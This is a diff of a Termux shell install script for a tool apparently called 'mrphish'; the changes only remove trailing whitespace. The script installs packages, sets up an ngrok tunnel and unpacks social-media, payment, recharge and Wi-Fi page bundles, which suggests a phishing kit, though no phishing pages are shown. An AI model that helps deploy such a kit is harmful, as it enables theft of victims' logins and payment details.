@@ -22,7 +22,7 @@ clear
 echo -e "\e[96m      |------------[ INSTALLATION STARTED ]-----------------|"
 echo -e "\e[96m      |-------[KEEP YOUR DEVICE AWAY FOR WHILE]-------------|"
 sleep 8.0
-apt-get update 
+apt-get update
 apt-get upgrade
 echo " "
 echo " "
@@ -38,7 +38,7 @@ pkg install python -y > /dev/null 2>&1
 pkg install python2 -y > /dev/null 2>&1
 pkg install nano -y > /dev/null 2>&1
 pkg install php -y > /dev/null 2>&1
-pip install lolcat 
+pip install lolcat
 cd /sdcard > /dev/null 2>&1
 mkdir dUmpS > /dev/null 2>&1
 cd $HOME/mrphish > /dev/null 2>&1
@@ -68,7 +68,7 @@ am start -a android.intent.action.VIEW -d https://www.ngrok.com
 clear
 read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
 ./ngrok authtoken $name
-clear 
+clear
 mv ngrok $HOME/mrphish/core > /dev/null 2>&1
 cd $HOME/mrphish > /dev/null 2>&1
 cd core/deploys > /dev/null 2>&1
@@ -90,8 +90,8 @@ unzip socialmedia10.zip > /dev/null 2>&1
 unzip socialmedia11.zip > /dev/null 2>&1
 unzip socialmedia12.zip > /dev/null 2>&1
 unzip payment.zip > /dev/null 2>&1
-unzip recharge.zip > /dev/null 2>&1                                                                      
-unzip wifirt.zip > /dev/null 2>&1                                                                    
+unzip recharge.zip > /dev/null 2>&1
+unzip wifirt.zip > /dev/null 2>&1
 cd socialmedia1 > /dev/null 2>&1
 mv * $HOME/mrphish/core/deploys/socialmedia > /dev/null 2>&1
 cd $HOME/mrphish/core/deploys > /dev/null 2>&1
